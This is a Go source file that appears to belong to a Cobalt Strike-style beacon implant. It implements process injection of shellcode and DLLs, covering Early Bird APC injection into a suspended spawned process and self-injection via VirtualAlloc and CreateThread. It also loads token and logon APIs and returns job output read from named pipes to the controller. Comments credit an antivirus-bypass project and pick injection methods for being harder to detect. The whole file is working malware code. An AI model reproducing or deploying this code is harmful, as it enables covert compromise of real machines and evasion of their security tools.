package command

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"io"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"strings"
	"time"
	"unsafe"
)

// use windows packet as much as possible
var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	advapi32                = windows.NewLazyDLL("Advapi32.dll")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
	createThread            = kernel32.NewProc("CreateThread")
	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	adjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	logonUserA              = advapi32.NewProc("LogonUserA")
)

// implement of beacon.Job

func InjectDllSelfX86(dll []byte) error {
	if sysinfo.IsProcessX64() {
		return errors.New("can not inject x86 dll into x64 beacon")
	} else {
		return InjectSelf(dll)
	}
}

func InjectDllSelfX64(dll []byte) error {
	if !sysinfo.IsProcessX64() {
		return errors.New("can not inject x64 dll into x86 beacon")
	} else {
		return InjectSelf(dll)
	}
}

// you should ensure x86 shellcode inject to x86 process
func GetSpawnProcessX86() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := config.SpawnToX86
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := strings.Replace(config.SpawnToX86, "syswow64", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func GetSpawnProcessX64() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := config.SpawnToX64
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func SpawnAndInjectDllX64(dll []byte) error {
	program, args := GetSpawnProcessX64()
	err := SpawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDllX86(dll []byte) error {
	program, args := GetSpawnProcessX86()
	err := SpawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDll(dll []byte, program string, args string) error {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := CreateProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	return callUserAPC(procInfo, dll)

	// createRemoteThread can be easily caught, you should never use it
	//return createRemoteThread(procInfo, dll)
}

// copy from GolangBypassAV EarlyBird
func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
	}
	var length uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), &length)
	if errWriteProcessMemory != nil {
		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
	}
	_, _, err := queueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return errors.New(fmt.Sprintf("CloseHandle error: %s", errCloseThreadHandle.Error()))
	}
	return nil
}

// copy from GolangBypassAV CreateThreadNative
func InjectSelf(shellcode []byte) error {
	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", err.Error()))
	}

	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("RtlCopyMemory error: %s", errRtlCopyMemory.Error()))
	}
	oldProtect := uint32(windows.PAGE_READWRITE)
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return errors.New(fmt.Sprintf("VirtualProtect error: %s", err.Error()))

	}
	//var lpThreadId uint32
	thread, _, errCreateThread := createThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("CreateThread error: %s", errCreateThread.Error()))
	}
	_, err = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if err != nil {
		return errors.New(fmt.Sprintf("WaitForSingleObject error: %s", err.Error()))
	}
	return nil
}

func HandlerJob(b []byte) error {
	buf := bytes.NewBuffer(b)
	// read first zero bytes
	_, _ = ParseAnArg(buf)
	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	callbackType := packet.ReadShort(callbackTypeByte)

	sleepTime := packet.ReadShort(sleepTimeByte)
	pipeName, _ := ParseAnArg(buf)
	// command type, seems useless?
	_, _ = ParseAnArg(buf)
	// sleep time is 1
	fmt.Printf("Sleep time: %d\n", sleepTime)
	time.Sleep(time.Second * time.Duration(sleepTime))
	result, err := ReadNamedPipe(pipeName)
	if err != nil {
		return err
	}
	finalPacket := packet.MakePacket(int(callbackType), []byte(result))
	packet.PushResult(finalPacket)
	return nil
}

func ReadNamedPipe(pipeName []byte) (string, error) {
	pipe, err := winio.DialPipe(string(pipeName), nil)
	if err != nil {
		return "", err
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512)
	for {
		n, err := pipe.Read(buf)
		if err != nil {
			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
				return "", err
			}
			break
		}
		result += string(buf[:n])
	}
	return result, nil
}
